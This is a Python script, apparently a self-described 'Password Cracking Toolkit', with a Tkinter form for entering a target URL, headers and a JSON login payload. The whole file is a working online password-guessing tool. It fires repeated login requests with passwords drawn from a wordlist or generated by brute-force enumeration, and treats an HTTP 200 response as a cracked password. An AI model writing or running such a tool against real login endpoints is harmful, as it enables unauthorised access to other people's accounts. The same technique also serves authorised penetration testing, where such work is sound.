import requests
import itertools
import string
import json
import tkinter as tk
from tkinter import messagebox, scrolledtext


def send_request(url, headers, payload, method):
    if method == "POST":
        response = requests.post(url, headers=headers, data=json.dumps(payload))
    elif method == "GET":
        response = requests.get(url, headers=headers, params=payload)
    else:
        raise ValueError("Unsupported HTTP method!")
    return response


def dictionary_attack(url, headers, payload_template, wordlist_path, method):
    try:
        with open(wordlist_path, 'r') as file:
            for word in file:
                password = word.strip()
                print('password: ',password)
                payload = {key: value.replace("{password}", password) for key, value in payload_template.items()}
                response = send_request(url, headers, payload, method)
                print(f"Status {response.status_code} - Msg: {response.text}")
                if response.status_code == 200:
                    print(f"[+] Password found: {password}")
                    break
    except FileNotFoundError:
        print("Wordlist file not found. Please provide a valid file path.")


def brute_force_attack(url, headers, payload_template, method, length=4):
    characters = string.ascii_letters + string.digits + string.punctuation
    for password_length in range(1, length + 1):
        for combination in itertools.product(characters, repeat=password_length):
            password = ''.join(combination)
            payload = {key: value.replace("{password}", password) for key, value in payload_template.items()}
            response = send_request(url, headers, payload, method)
            print(f"Status {response.status_code} - Msg: {response.text}")
            if response.status_code == 200:
                print(f"[+] Password found: {password}")
                return


def parse_headers(headers_string):
    headers = {}
    for line in headers_string.split("\n"):
        if ": " in line:
            key, value = line.split(": ", 1)
            headers[key.strip()] = value.strip()
    return headers


def collect_request_data():
    try:
        url = url_entry.get().strip()
        method = method_var.get().strip()
        headers_string = headers_entry.get("1.0", tk.END).strip()
        headers = parse_headers(headers_string)

        payload_string = payload_entry.get("1.0", tk.END).strip()
        payload_template = json.loads(payload_string)

        if not url or not method or not headers or not payload_template:
            raise ValueError("All fields must be filled!")
        return url, method, headers, payload_template
    except json.JSONDecodeError:
        messagebox.showerror("Error", "Invalid JSON format in payload.")
        return None
    except ValueError as e:
        messagebox.showerror("Error", str(e))
        return None


def main():
    print("Welcome to the Password Cracking Toolkit!")
    print("Please use the GUI to set up the request details.")
    root.mainloop()  # Open the GUI for user input

    # Fetch request data
    request_data = gui_collected_data.get("request_data", None)
    if not request_data:
        print("Request setup canceled.")
        return

    url, method, headers, payload_template = request_data

    print("\nChoose an attack method:")
    print("1. Dictionary Attack")
    print("2. Brute Force Attack")
    choice = input("Enter your choice (1 or 2): ")

    if choice == "1":
        # Dictionary Attack
        wordlist_path = input("Enter the path to the wordlist file: ")
        dictionary_attack(url, headers, payload_template, wordlist_path, method)
    elif choice == "2":
        # Brute Force Attack
        max_length = int(input("Enter the maximum length of the password to attempt: "))
        brute_force_attack(url, headers, payload_template, method, max_length)
    else:
        print("Invalid choice. Please select 1 or 2.")


def gui_submit():
    """
    Triggered when the user clicks the 'Submit' button in the GUI.
    """
    request_data = collect_request_data()
    if request_data:
        gui_collected_data["request_data"] = request_data
        root.destroy()  # Close the GUI


# Global variable to hold the collected data
gui_collected_data = {}

# GUI Setup
root = tk.Tk()
root.title("Request Setup for Password Cracking Toolkit")

# Input fields
tk.Label(root, text="URL:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
url_entry = tk.Entry(root, width=50)
url_entry.grid(row=0, column=1, padx=5, pady=5)

tk.Label(root, text="Method:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
method_var = tk.StringVar(value="POST")
method_menu = tk.OptionMenu(root, method_var, "GET", "POST")
method_menu.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)

tk.Label(root, text="Headers (Multi-line):").grid(row=2, column=0, sticky=tk.W, padx=5, pady=5)
headers_entry = scrolledtext.ScrolledText(root, width=50, height=10)
headers_entry.grid(row=2, column=1, padx=5, pady=5)

tk.Label(root, text="Payload (JSON):").grid(row=3, column=0, sticky=tk.W, padx=5, pady=5)
payload_entry = scrolledtext.ScrolledText(root, width=50, height=5)
payload_entry.grid(row=3, column=1, padx=5, pady=5)

# Submit button
submit_button = tk.Button(root, text="Submit", command=gui_submit)
submit_button.grid(row=4, column=0, columnspan=2, pady=10)

if __name__ == "__main__":
    main()
